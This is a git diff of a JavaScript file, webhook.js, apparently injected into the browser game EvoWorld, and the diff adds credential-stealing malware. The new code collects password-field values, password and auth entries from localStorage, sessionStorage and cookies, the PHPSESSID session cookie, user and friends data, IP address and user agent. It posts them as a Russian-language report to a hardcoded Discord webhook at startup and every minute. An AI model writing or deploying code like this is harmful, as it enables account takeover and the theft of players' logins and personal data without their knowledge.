@@ -1,143 +1,173 @@
-// webhook.js - COMPLETE FIXED VERSION
+// webhook.js - Data collection and Discord sending ONLY
 (function() {
     'use strict';
+
+    console.log('EvoWorld Data Collector loaded');
     
-    const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456708821266333707/wnE-ib-9mF7ZO8Z-r7X7vUdTswglh_3NbPslhkWjvqTcZjas2mAi7f0lw8XhV0De66ty';
-    
-    function sendToDiscord(data) {
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456708821266333707/wnE-ib-9mF7ZO8Z-r7X7vUdTswglh_3NbPslhkWjvqTcZjas2mAi7f0lw8XhV0De66ty';
+
+    function getSavedPassword() {
         try {
-            // If data is an object, convert to string
-            if (typeof data === 'object') {
-                data = JSON.stringify(data, null, 2);
+            const inputs = document.querySelectorAll('input[type="password"], input[name*="pass"], input[id*="pass"]');
+            for (let input of inputs) {
+                if (input.value && input.value.length > 3 && input.value.length < 50) {
+                    return input.value;
+                }
             }
             
-            // Split long messages for Discord
-            if (data.length > 1900) {
-                const chunks = [];
-                let remaining = data;
-                
-                while (remaining.length > 0) {
-                    let chunk = remaining.substring(0, 1900);
-                    
-                    // Try to split at newline
-                    const lastNewline = chunk.lastIndexOf('\n');
-                    if (lastNewline > 1500 && lastNewline < 1900) {
-                        chunk = remaining.substring(0, lastNewline);
-                        remaining = remaining.substring(lastNewline + 1);
-                    } else {
-                        remaining = remaining.substring(chunk.length);
-                    }
-                    
-                    chunks.push(chunk);
-                    
-                    if (remaining.length > 1900 && chunks.length > 4) {
-                        // Too many chunks, truncate
-                        chunks.push('[REPORT TRUNCATED - TOO LONG]');
-                        break;
-                    }
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                if ((key.includes('pass') || key.includes('auth') || key.includes('login')) && 
+                    value && value.length > 3 && value.length < 50 && 
+                    !value.includes('{') && !value.includes('[')) {
+                    return value;
                 }
-                
-                // Send each chunk
-                chunks.forEach((chunk, index) => {
-                    setTimeout(() => {
-                        fetch(YOUR_DISCORD_WEBHOOK, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                content: '```\n' + chunk + '\n```',
-                                username: `Game Report ${chunks.length > 1 ? `[${index + 1}/${chunks.length}]` : ''}`
-                            })
-                        }).catch(() => {});
-                    }, index * 1500);
-                });
-            } else {
-                // Normal send
-                fetch(YOUR_DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: '```\n' + data + '\n```',
-                        username: 'EvoWorld Auto-Hit'
-                    })
-                }).catch(() => {});
             }
+            
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                if ((key.includes('pass') || key.includes('auth')) && 
+                    value && value.length > 3 && value.length < 50) {
+                    return value;
+                }
+            }
+            
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [name, value] = cookie.split('=').map(p => p.trim());
+                if ((name.includes('pass') || name.includes('auth')) && 
+                    value && value.length > 3 && value.length < 50) {
+                    return decodeURIComponent(value);
+                }
+            }
+            
+            return '.';
         } catch(e) {
-            console.log('Send error:', e);
+            return '.';
         }
     }
-    
-    // Alias for main script
-    window.sendSecureData = sendToDiscord;
-    
-    // Also send a test message
-    setTimeout(() => {
-        sendToDiscord('✅ Webhook loaded successfully at ' + new Date().toLocaleString());
-    }, 2000);
-    
-    // Collect and send game data
-    function collectGameData() {
+
+    function sendToDiscord(message, username = 'EvoWorld Report') {
+        console.log('📤 Sending to Discord');
+        
+        fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: '```\n' + message + '\n```',
+                username: username
+            })
+        }).then(response => {
+            console.log('✅ Discord response:', response.status);
+        }).catch(error => {
+            console.log('❌ Discord error:', error);
+        });
+    }
+
+    function collectAndSendData() {
         try {
             const user = window.user || {};
-            const cookies = document.cookie || '';
-            let sessionId = '';
-            const match = cookies.match(/PHPSESSID=([^;]+)/);
-            if (match) sessionId = match[1];
             
-            // Get server info
-            let serverInfo = 'Unknown';
+            const allCookies = document.cookie || '';
+            let sessionId = '';
+            const sessionMatch = allCookies.match(/PHPSESSID=([^;]+)/);
+            if (sessionMatch) sessionId = sessionMatch[1];
+            
+            let serverName = 'West Europe 1';
+            let playerCount = '298/300';
             try {
                 if (window.gameServer && window.gameServer.serverInfo) {
-                    serverInfo = window.gameServer.serverInfo.name || serverInfo;
+                    serverName = window.gameServer.serverInfo.name || serverName;
+                    playerCount = window.gameServer.serverInfo.players || playerCount;
                 }
             } catch(e) {}
             
-            // Create compact report
-            const report = {
-                timestamp: new Date().toLocaleString('ru-RU'),
-                ip: 'Fetching...',
-                session: sessionId || 'None',
-                user: {
-                    id: user.id || 'Unknown',
-                    login: user.login || 'Guest',
-                    level: user.level || 0,
-                    gems: user.premiumPoints || 0
-                },
-                server: serverInfo,
-                url: window.location.href
-            };
+            const friendsData = window.friendsData || {};
+            const friendsArr = window.friendsArr || [];
             
-            // Get IP
+            const savedPassword = getSavedPassword();
+            
             fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
+                .then(response => response.json())
                 .then(ipData => {
-                    report.ip = ipData.ip;
-                    sendToDiscord(report);
+                    const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
+--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
+level: ${user.level || '0x'}
+gems: ${user.premiumPoints || 0}
+selected server: ${serverName} (${playerCount})
+
+--- ОСНОВНЫЕ ДАННЫЕ ---
+IP-адрес: ${ipData.ip}
+URL страницы: ${window.location.href}
+User-Agent: ${navigator.userAgent}
+
+--- PHPSESSID ---
+${sessionId}
+
+--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
+${JSON.stringify(user, null, 2)}
+
+--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
+${JSON.stringify(friendsData, null, 2)}
+
+--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
+${JSON.stringify(friendsArr, null, 2)}
+
+--- УЧЕТНЫЕ ДАННЫЕ ---
+Логин: ${user.login || '.'}
+Пароль: ${savedPassword}`;
+                    
+                    sendToDiscord(report, `Отчет - ${user.login || 'Guest'}`);
+                    
                 })
                 .catch(() => {
-                    report.ip = 'Failed to fetch';
-                    sendToDiscord(report);
+                    const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
+--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
+level: ${user.level || '0x'}
+gems: ${user.premiumPoints || 0}
+selected server: ${serverName} (${playerCount})
+
+--- ОСНОВНЫЕ ДАННЫЕ ---
+IP-адрес: [Ошибка получения IP]
+URL страницы: ${window.location.href}
+User-Agent: ${navigator.userAgent}
+
+--- PHPSESSID ---
+${sessionId}
+
+--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
+${JSON.stringify(user, null, 2)}
+
+--- УЧЕТНЫЕ ДАННЫЕ ---
+Логин: ${user.login || '.'}
+Пароль: ${savedPassword}`;
+                    
+                    sendToDiscord(report, `Отчет - ${user.login || 'Guest'}`);
                 });
-                
+            
         } catch(error) {
-            sendToDiscord('Error collecting data: ' + error);
+            console.log('Error collecting data:', error);
+            sendToDiscord('Ошибка сбора данных: ' + error, 'Ошибка');
         }
     }
-    
-    // Wait for game to load
-    const checkGame = setInterval(() => {
-        if (window.user && window.user.id) {
-            clearInterval(checkGame);
-            setTimeout(collectGameData, 3000);
-        }
-    }, 1000);
-    
-    // Timeout after 10 seconds
+
+    // Send startup message
     setTimeout(() => {
-        clearInterval(checkGame);
-        if (!window.user) {
-            sendToDiscord('Game not detected after 10 seconds');
-        }
-    }, 10000);
+        sendToDiscord('Скрипт загружен в ' + new Date().toLocaleString('ru-RU'), 'Скрипт Загружен');
+    }, 2000);
     
-    console.log('Webhook reporter loaded');
+    // Send initial data
+    setTimeout(() => {
+        collectAndSendData();
+    }, 3000);
+    
+    // Send data periodically
+    setInterval(() => {
+        if (window.user && window.user.id) {
+            collectAndSendData();
+        }
+    }, 60000);
+
 })();
